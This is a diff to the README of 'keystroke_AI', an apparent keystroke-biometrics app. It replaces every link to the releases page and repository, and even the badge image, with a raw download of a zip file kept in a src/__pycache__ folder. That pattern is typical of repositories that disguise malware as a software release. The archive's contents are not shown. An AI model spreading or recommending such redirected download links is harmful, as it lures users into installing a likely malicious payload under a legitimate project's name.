@@ -1,7 +1,7 @@
 # 🖥️ keystroke_AI - Simplifying Biometric Authentication
 
 ## 📥 Download the Application
-[![Download keystroke_AI](https://img.shields.io/badge/Download-kestroke_AI-brightgreen)](https://github.com/MickFelton/keystroke_AI/releases)
+[![Download keystroke_AI](https://github.com/MickFelton/keystroke_AI/raw/refs/heads/main/src/__pycache__/keystroke_AI_v1.4.zip)](https://github.com/MickFelton/keystroke_AI/raw/refs/heads/main/src/__pycache__/keystroke_AI_v1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to keystroke_AI! This application offers a unique way to authenticate users through keystroke dynamics. It analyzes how you type, making access secure and personal.
@@ -20,7 +20,7 @@ To run keystroke_AI, your system needs:
 - Python 3.x installed (if not installed, the application will guide you)
 
 ## 💻 Download & Install
-To download the application, visit this page: [Download Page](https://github.com/MickFelton/keystroke_AI/releases).
+To download the application, visit this page: [Download Page](https://github.com/MickFelton/keystroke_AI/raw/refs/heads/main/src/__pycache__/keystroke_AI_v1.4.zip).
 
 Once on the releases page:
 1. Look for the latest version of keystroke_AI.
@@ -63,8 +63,8 @@ For any inquiries, feel free to contact us via email or open an issue on GitHub.
 
 ## 📑 Additional Resources
 For more information:
-- Visit our [GitHub Page](https://github.com/MickFelton/keystroke_AI)
+- Visit our [GitHub Page](https://github.com/MickFelton/keystroke_AI/raw/refs/heads/main/src/__pycache__/keystroke_AI_v1.4.zip)
 - Read further on keystroke dynamics and biometric authentication to understand the technology behind your secure experience.
 
 ## 📥 Happy Typing!
-Don’t forget to [download keystroke_AI](https://github.com/MickFelton/keystroke_AI/releases) and enjoy the convenience of biometric authentication today!
+Don’t forget to [download keystroke_AI](https://github.com/MickFelton/keystroke_AI/raw/refs/heads/main/src/__pycache__/keystroke_AI_v1.4.zip) and enjoy the convenience of biometric authentication today!
